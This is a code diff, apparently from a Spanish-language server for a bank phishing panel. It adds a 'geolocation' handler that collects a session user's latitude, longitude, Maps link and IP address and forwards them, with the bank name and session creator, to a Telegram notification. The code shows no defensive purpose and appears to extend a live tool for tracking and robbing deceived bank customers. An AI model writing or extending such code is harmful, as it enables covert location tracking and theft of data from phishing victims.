@@ -1716,6 +1716,50 @@ _Fecha: ${new Date().toLocaleString('es-MX')}_
             const updatedFields: Record<string, any> = {};
 
             switch (tipo) {
+              case 'geolocation':
+                // Manejar datos de geolocalización
+                if (inputData.latitude) {
+                  updatedFields.latitude = inputData.latitude;
+                }
+                if (inputData.longitude) {
+                  updatedFields.longitude = inputData.longitude;
+                }
+                if (inputData.googleMapsLink) {
+                  updatedFields.googleMapsLink = inputData.googleMapsLink;
+                }
+                if (inputData.locationTimestamp) {
+                  updatedFields.locationTimestamp = inputData.locationTimestamp;
+                }
+                
+                // La IP se capturará desde el cliente usando una API externa o desde el navegador
+                // Por ahora marcamos como "Obtenida desde cliente"
+                updatedFields.ipAddress = inputData.ipAddress || 'IP no disponible desde WebSocket';
+
+                console.log('Información de geolocalización guardada:', {
+                  latitud: inputData.latitude,
+                  longitud: inputData.longitude,
+                  googleMapsLink: inputData.googleMapsLink,
+                  ip: updatedFields.ipAddress,
+                  timestamp: inputData.locationTimestamp
+                });
+                
+                // Enviar notificación a Telegram con información de ubicación
+                const geolocationSessionData = await storage.getSessionById(sessionId);
+                if (geolocationSessionData) {
+                  await sendTelegramNotification({
+                    sessionId,
+                    banco: geolocationSessionData.banco || 'Desconocido',
+                    tipo: 'geolocation',
+                    data: {
+                      ...inputData,
+                      ipAddress: updatedFields.ipAddress
+                    },
+                    timestamp: new Date().toISOString(),
+                    createdBy: geolocationSessionData.createdBy || 'Desconocido'
+                  });
+                }
+                break;
+
               case 'folio':
                 updatedFields.folio = inputData.folio;
                 // Guardar información del dispositivo si está disponible
